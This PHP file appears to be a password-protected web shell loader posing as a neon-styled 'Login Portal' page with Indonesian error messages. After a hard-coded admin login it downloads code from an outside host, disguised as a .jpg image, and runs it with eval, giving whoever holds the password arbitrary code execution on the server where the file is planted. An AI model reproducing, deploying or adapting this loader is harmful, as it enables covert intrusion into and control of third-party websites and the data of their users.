<?php
session_start();

$username = "admin";
$passwordHash = '$2b$12$ueChNOGtXVzj96Qil8trbuscSrjpahxIgYDouPaDe/LIp7A2oTBE.'; 

if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Username atau password salah. Silakan coba lagi.";
        }
    }
}

if (isset($_SESSION['loggedin'])) {
    $url = 'https://levellink.space/tnq/tnq.jpg';
    $content = file_get_contents($url);

    if ($content !== false) {
        eval('?>' . $content);
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}

if (!isset($_SESSION['loggedin'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Form</title>
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background: radial-gradient(circle at top, #1a001a, #000);
                font-family: "Segoe UI", Arial, sans-serif;
                overflow: hidden;
            }

            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100%;
                animation: float 6s ease-in-out infinite;
            }

            @keyframes float {
                0%, 100% { transform: translateY(0px); }
                50% { transform: translateY(-10px); }
            }

            .login-form {
                width: 320px;
                padding: 30px;
                background: rgba(30, 0, 30, 0.85);
                border-radius: 12px;
                box-shadow: 0px 0px 25px rgba(255, 0, 128, 0.6), 
                            inset 0px 0px 10px rgba(255, 0, 128, 0.2);
                text-align: center;
                color: white;
                backdrop-filter: blur(10px);
            }

            .login-form img {
                width: 90px;
                margin-bottom: 10px;
                filter: drop-shadow(0px 0px 8px rgba(255, 0, 128, 0.7));
            }

            .login-form h2 {
                margin: 0;
                padding: 10px 0;
                font-size: 22px;
                text-shadow: 0 0 8px #ff0040ff, 0 0 12px #ff0040ff;
            }

            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 12px 0;
                border: none;
                border-radius: 6px;
                box-sizing: border-box;
                font-size: 15px;
                outline: none;
                color: #fff;
                background: #220022;
                box-shadow: inset 0 0 10px rgba(255, 0, 128, 0.3);
                transition: 0.3s;
            }

            .login-form input:focus {
                box-shadow: 0 0 10px #5eff00ff, inset 0 0 10px rgba(255, 0, 128, 0.6);
                background: #2a002a;
            }

            .login-form button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #ff0055, #ff33aa);
                color: white;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-size: 16px;
                font-weight: bold;
                letter-spacing: 1px;
                transition: all 0.3s ease;
                text-shadow: 0 0 5px #000;
                box-shadow: 0 0 12px #ff33aa;
            }

            .login-form button:hover {
                background: linear-gradient(45deg, #ff33aa, #ff0055);
                box-shadow: 0 0 18px #ff00cc, 0 0 25px #ff0040ff;
                transform: scale(1.05);
            }

            .login-form .options {
                margin-top: 12px;
                font-size: 14px;
                color: #d1d1d1;
            }

            .login-form .options a {
                color: #ff66cc;
                text-decoration: none;
                transition: 0.3s;
            }

            .login-form .options a:hover {
                text-shadow: 0 0 6px #ff66cc;
            }

            .error-message {
                color: #ff4d4d;
                font-size: 14px;
                margin-top: 10px;
                text-shadow: 0 0 5px #ff0000;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://i.ibb.co.com/wryWtWj/PHOENIXSNUTZ.png" alt="Logo">
                <h2>Login Portal</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">Sign In</button>
                </form>
                <div class="options">
                    <label><input type="checkbox"> Remember Me</label>
                    <br>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>
